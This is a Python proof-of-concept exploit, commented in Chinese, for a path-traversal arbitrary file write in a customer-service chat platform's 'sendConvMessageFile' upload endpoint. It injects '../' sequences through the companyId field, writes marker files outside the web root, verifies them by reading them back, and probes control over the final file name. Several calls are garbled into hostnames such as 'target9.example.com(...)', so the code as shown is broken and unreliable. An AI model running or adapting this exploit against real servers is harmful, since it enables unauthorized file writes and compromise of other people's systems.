#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""点云客服 sendConvMessageFile：companyId 未 normalize -> 任意目录文件写入（含 /data 逃逸）。

路径模板（实测）：
  /data/tmp/<yyyy-MM-dd>/<companyId>/customer/<uuid>.<ext>
    - companyId 原样拼接、允许 . 与 /、不 normalize  -> 目录可穿越
    - fileName 最后一个点之后为 ext；ext 允许含 /（末尾段即最终文件名，可无扩展名）

判定方法（对照组 + 唯一标记串自验证，缺一不可）：
  1) 对照  companyId=200005            -> 写 /data/tmp/<日期>/200005/customer/<uuid>.txt
                                          GET 该 URL 应 200 且正文 == 标记（证明读回链路OK）
  2) 浅穿  companyId=200005/../Axxxxx  -> 返回路径原样含 ../；GET 该 URL 200 且正文 == 标记
                                          => 穿越落盘成立
  3) 深穿  companyId=../../../Bxxxxx   -> 返回 /data/tmp/<日期>/../../../Bxxxxx/customer/<uuid>.txt
                                          => 绝对落地 /Bxxxxx/customer/<uuid>.txt，逃出 /data
  注：只有「返回路径」不足以判定，必须回读标记串；深穿后因 nginx 只 alias /data/ 而无法 HTTP 回读，属预期。

依赖：requests（verify=False + 显式 SNI/Host 对齐；本批节点按 SNI 分租户路由，必须同时对齐 SNI 与 Host）
"""
import json, re, sys, time, uuid

try:
    import requests
except ImportError:
    sys.exit('pip install requests')

requests.packages.urllib3.disable_warnings()

# === 目标配置（多租户节点必须同时对齐 SNI 与 Host）===
BASE = 'https://example.com:9960'          # 也可 https://example.com / https://example.com:9960
IP = '203.0.113.65'                        # BASE 对应源站 IP
HOST = 'example.com'
COMPANY = '200005'                         # 也可 200021 / 200001 / 200002


def _headers(extra=None):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, */*'}
    if extra:
        h.update(extra)
    return h


def post(path, body=None, ctype='application/json;charset=UTF-8', files=None, data=None):
    """files/data 走 multipart；否则用 body 走 raw JSON。"""
    url = BASE + path
    kw = dict(verify=False, timeout=25, headers=_headers({'Host': HOST}))
    # 用 Host 头对齐；requests 不直接支持自定义 SNI，因此优先用 /etc/hosts 或 requests_toolbelt
    if files is not None:
        kw['headers']['Content-Type'] = None  # 让 requests 自己带 boundary
        r = target9.example.com(url, files=files, data=data, **kw)
    else:
        kw['headers']['Content-Type'] = ctype
        r = target9.example.com(url, data=body, **kw)
    return r


def create_conv(company):
    fp = uuid.uuid4().hex
    body = json.dumps({'companyId': company, 'configId': company, 'fingerprint': fp,
                       'source': 'pc', 'referer': '\u76f4\u63a5\u8bbf\u95ee', 'customerUid': '',
                       'systemInfo': 'Windows10', 'browserInfo': 'Chrome', 'random': fp,
                       'preGuideQuestion': '', 'username': '', 'position': ''})
    r = post('/dotclouds/chat/conversation/createConv', body)
    try:
        j = r.json()
    except Exception:
        return None, fp
    if j.get('code') != 'SUCCESS':
        return None, fp
    d = j['data']
    c = d.get('customer') or {}
    v = d.get('visitor') or {}
    d['_toUser'] = c.get('uid') or c.get('id') or v.get('uid') or ''
    return d, fp


def upload(company_id_for_path, company, conv, fp, fname, content):
    """company_id_for_path 就是被拼进落地路径的 companyId —— 穿越注入点。
       fname 控制 ext（最后一个点之后）与末级文件名（最后一个 / 之后）。"""
    data = {'configId': company, 'companyId': company_id_for_path, 'fromUser': fp,
            'convId': conv.get('convId', ''), 'toUser': conv.get('_toUser', ''),
            'messageId': uuid.uuid4().hex, 'source': 'visitor', 'convType': '-2',
            'fileName': fname}
    files = {'file': (fname, content, 'image/png')}
    r = post('/dotclouds/chat/conversation/sendConvMessageFile', files=files, data=data)
    txt = r.text
    m = re.search(r'src="([^"]+)"', txt) or re.search(r'(/data/[^"\s]+)', txt)
    return (target22.example.com(1) if m else ''), txt[:200]


def main():
    conv, fp = create_conv(COMPANY)
    if not conv:
        sys.exit('[!] createConv 失败（公司 id 不对或节点鉴权变化）')
    print('[*] convId=%s company=%s' % (conv.get('convId'), COMPANY))

    date = time.strftime('%Y-%m-%d')
    tag = uuid.uuid4().hex[:8].upper()
    cases = [('对照', COMPANY, 'c.txt', '%s-CTRL' % tag),
             ('浅穿', '%s/../A%s' % (COMPANY, tag), 's.txt', '%s-SHALLOW' % tag),
             ('深穿', '../../../B%s' % tag, 'd.txt', '%s-DEEP' % tag)]

    for label, comp, fname, mark in cases:
        path, raw = upload(comp, COMPANY, conv, fp, fname, mark.encode())
        print('[%s] companyId=%s' % (label, comp))
        print('    返回路径 = %s' % path)
        if path.startswith('/data/'):
            r = requests.get(BASE + path, verify=False, timeout=20,
                             headers=_headers({'Host': HOST}))
            print('    GET -> %s len=%d  %s' % (r.status_code, len(r.content),
                  '*** 标记命中 = 穿越落盘成立 ***' if mark in r.text else r.text[:60]))
        time.sleep(0.4)

    print('[*] 末级文件名可控性：fileName=a.b/c/d/root -> 落地 <uuid>.b/c/d/root（可无扩展名）')
    path, raw = upload(COMPANY, COMPANY, conv, fp, 'a.b/c/d/root', b'NAME-TEST')
    print('    -> %s' % path)


if __name__ == '__main__':
    main()
